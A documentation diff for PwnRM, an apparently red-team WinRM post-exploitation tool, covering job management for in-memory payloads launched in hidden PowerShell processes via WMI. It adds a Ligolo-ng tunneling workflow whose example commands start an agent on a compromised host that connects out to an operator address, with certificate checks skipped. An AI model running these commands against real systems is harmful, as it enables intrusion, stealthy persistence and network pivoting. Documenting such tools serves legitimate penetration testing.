@@ -116,7 +116,9 @@ payload running. Managed assemblies use the same background-by-default policy.
 The background context belongs to the current remote RunspacePool, so the
 interactive PwnRM session must remain open for a long-lived payload. Single
 command mode (`-X`) closes the pool and is therefore unsuitable for this
-session-owned default mode.
+session-owned default mode. `!jobs list`, `!jobs status ID`, `!jobs output ID`,
+and `!jobs stop ID` manage these jobs. Output becomes available after a
+runspace job completes.
 
 `--detached` is the explicit independent-job mode. PwnRM creates a hidden
 PowerShell process through local WMI, passes the loader and payload from the
@@ -125,8 +127,11 @@ in-memory-load acknowledgement, and returns the target PID. No payload PE is
 written to the target when `SOURCE` is operator-local or an operator-fetched
 URL. The process survives closure of PwnRM's RunspacePool, but not host reboot,
 explicit process termination, or endpoint controls. It cannot be combined with
-`--capture-output`; stop the returned PID explicitly when the engagement task
-is complete.
+`--capture-output`. PwnRM records the PID in a mode-`0600` local registry so
+`!jobs status ID` and `!jobs stop ID` continue to work after reconnecting to the
+same target. Payload arguments are not persisted.
+PwnRM also persists the process creation timestamp and verifies it before any
+stop operation, so a recycled Windows PID is never treated as the original job.
 
 Native execution uses the upstream
 [No-Consolation](https://github.com/fortra/No-Consolation) BOF through
@@ -149,26 +154,45 @@ context before an engagement.
 
 ## Detached Ligolo-ng agent (`!ligolo`)
 
-`!ligolo` is a purpose-specific alias for detached native No-Consolation
-execution, inspired by the Sliver alias layout in
+`!ligolo` is a managed detached native No-Consolation workflow inspired by the
+Sliver alias layout in
 [KriyosArcane/sliver-ligolo-ng](https://github.com/KriyosArcane/sliver-ligolo-ng).
-PwnRM does not bundle or silently download an agent: supply a Windows agent you
-built or verified yourself.
+It supports multiple tracked agents, lifecycle control, restart during the
+current operator session, connection/TLS profiles, and an optional official
+release fetcher.
 
 ```text
-# Operator-local build: transferred through PSRP and the named pipe, never
-# written as a PE on the target.
-!ligolo ./ligolo-ng-agent-windows-amd64.exe -connect 192.0.2.10:11601 -ignore-cert
+# Fetch the latest official Windows build for the target architecture. PwnRM
+# verifies the archive against the release checksum before extracting agent.exe.
+!ligolo fetch
+
+# Auto-use a cached agent, or fetch one when none is installed.
+!ligolo start -connect 192.0.2.10:11601 -ignore-cert -retry
+
+# Operator-local build: transferred through PSRP and the named pipe.
+!ligolo start --agent ./agent.exe -connect 192.0.2.10:11601 -ignore-cert
 
 # Existing target-side agent (the source file is already on target disk).
-!ligolo --remote C:\ProgramData\agent.exe -connect 192.0.2.10:11601 -ignore-cert
+!ligolo start --remote C:\ProgramData\agent.exe -connect 192.0.2.10:11601 -ignore-cert
+
+# Save and use a certificate-pinned connection profile.
+!ligolo profile save lab 192.0.2.10:11601 --accept-fingerprint <64_HEX_SHA256>
+!ligolo start --profile lab
+
+# Multi-agent lifecycle.
+!ligolo list
+!ligolo status JOB_ID
+!ligolo restart JOB_ID
+!ligolo stop JOB_ID
+!ligolo cleanup
 ```
 
-The command always selects native, no-output, detached execution and prints the
-independent PowerShell PID. Ligolo arguments are forwarded unchanged. The
-proxy/listener, certificates, and network routes remain operator
-responsibilities; PwnRM only launches the agent. Use the returned PID for
-cleanup after the tunnel is stopped.
+The launcher always selects native, no-output, detached execution. The agent PE
+is not written to the target when it originates on the operator. Automatic
+fetching uses the official GitHub release API, accepts `amd64`, `386`, and
+`arm64`, verifies the published checksum, and stores the operator copy under
+`PWNRM_DIR` with restrictive permissions. PwnRM manages agent processes, not
+the Ligolo proxy's TUN interfaces or routes.
 
 ## Reverse shell (`!revshell`)
 
